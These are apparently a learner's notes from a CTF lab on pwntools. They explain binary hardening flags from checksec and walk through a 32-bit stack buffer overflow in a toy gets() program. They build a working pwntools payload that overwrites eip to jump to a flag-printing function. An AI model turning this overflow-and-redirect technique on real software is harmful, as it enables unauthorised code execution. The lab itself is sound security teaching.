# Intro to Pwntools


## Introduction
- Pwntools is a CTF framework and exploit development library
- [Pwntools github](https://github.com/Gallopsled/pwntools)

## Checksec
- Run checksec on the binaries
```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn1
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn2
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
- RELRO - Relocation Read-Only
	- Makes the global offset table (GOT) read-only after the linker resolves functions to it
	- GOT is important for techniques like the ret-to-libc attack
	- [Resource](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro)
- Stack canaries - tokens placed after a stack to detect a stack overflow
	- Sit beside the stack in the memory - where program variables are stored - and if there is a stack overflow then the stack canary will be corrupted
	- [Resource](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/)
- NX - non-executable
	- If enabled, then memory segments can be either writable or executable, but not both
	- Stops potential attackers from injecting their own malicious code (shellcode) into the program, because something in a writable segment cannot be executed
	- [Resource](https://en.wikipedia.org/wiki/Executable_space_protection)
- PIE - Position independent executable
	- Loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct
	- [Resource](https://www.redhat.com/en/blog/position-independent-executables-pie)
- [Overview resource](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/)
- Causing a buffer overflow in each of the binaries has a different result depending on whether it has canaries or not
```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn1
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn2
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault (core dumped)
```

## Cyclic
- The binary is vulnerable to buffer overflow because of `gets()`
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_flag() {
        printf("Getting Flag:\n");
        fflush(stdout);
        char *cat_flag[3] = {"/bin/cat", "flag.txt", NULL};
        execve("/bin/cat", cat_flag,  NULL);
        exit(0);
}

void start(){
        char name[24];
        gets(name);
}


int main(){
        printf("I run as dizmas.\n");
        printf("Who are you?: ");
        start();

}
```
- `print_flag()` isn't being called, so we can overwrite the instruction pointer - called eip on 32 bit machines and rip on 64 bit machines - and make it point to the `print_flag()` function
- Open the binary with gdb and run it with the text in the `alphabet` file as input. This causes a buffer overflow because the text in the file is longer than 24 bytes, and the eip register is overwritten with `0x4a4a4a4a`
```
pwndbg> r < alphabet
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < alphabet
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x4a4a4a4a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 EAX  0xff807408 \u25c2\u2014 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EBX  0x48484848 ('HHHH')
 ECX  0xf7f915c0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088
 EDX  0xf7f9289c (_IO_stdfile_0_lock) \u25c2\u2014 0x0
 EDI  0x0
 ESI  0xf7f91000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x1d7d8c
 EBP  0x49494949 ('IIII')
 ESP  0xff807430 \u25c2\u2014 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EIP  0x4a4a4a4a ('JJJJ')
Invalid address 0x4a4a4a4a

00:0000\u2502 esp 0xff807430 \u25c2\u2014 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
01:0004\u2502     0xff807434 \u25c2\u2014 'LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
02:0008\u2502     0xff807438 \u25c2\u2014 'MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
03:000c\u2502     0xff80743c \u25c2\u2014 'NNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
04:0010\u2502     0xff807440 \u25c2\u2014 'OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
05:0014\u2502     0xff807444 \u25c2\u2014 'PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
06:0018\u2502     0xff807448 \u25c2\u2014 'QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
07:001c\u2502     0xff80744c \u25c2\u2014 'RRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'

 \u25ba f 0 0x4a4a4a4a
   f 1 0x4b4b4b4b
   f 2 0x4c4c4c4c
   f 3 0x4d4d4d4d
   f 4 0x4e4e4e4e
   f 5 0x4f4f4f4f
   f 6 0x50505050
   f 7 0x51515151
```
- To make it easier to work with buffer overflows, we can use the `cyclic` tool
	- `cyclic 100` will create 100 characters
```
We can now begin to develop our exploit. To use pwntools in a python file, create a python file (mine is pwn_cyclic.py) and import the pwntools module at the top of the file:

from pwn import *

We can then use the cyclic function within the python code:

padding = cyclic(100)

Our padding is the space we need to get to the eip, so 100 is not the number we need. We need our padding to stop right before 'jaaa' so that we can fill in the eip with our own input. Luckily, there is a function in pwntools called cyclic_find(), which will find this automatically. Please replace the 100 with cyclic_find('jaaa'):

padding = cyclic(cyclic_find('jaaa'))

What do we fill the eip with? For now, to make sure we have the padding correct, we should fill it with a dummy value, like 0xdeadbeef. We cannot, of course, simply write "0xdeadbeef" as a string, because the computer would interpret it as ascii, and we need it as raw hex. Pwntools offers an easy way to do this, with the p32() function (and p64 for 64-bit programs). This is similar to the struct.pack() function, if you have ever used it. We can add this to our code:

eip = p32(0xdeadbeef)

Now our entire code should look like this:

from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)

Please run the file with python (not python3!) and output to a text file (my python file is called pwn_cyclic.py and my text file is called attack).

python pwn_cyclic.py > attack

Run this new text file as input to intro2pwn3 in gdb, and make sure that you get an invalid address at 0xdeadbeef. Please answer question 6.

The last thing we need to do is find the location of the print_flag() function. To find the print_flag() funtion, type this command into gdb:

print& print_flag

For me, the print_flag() function is at 0x8048536, please check to see if it is the same for you.

Replace the 0xdeadbeef in your code with the location of the print_flag function. Once, again, we can run:

python pwn_cyclic.py > attack

Input the attack file into the intro2pwn3 binary in the command line (because gdb will not use the suid permissions), like this:

./intro2pwn3 < attack
```
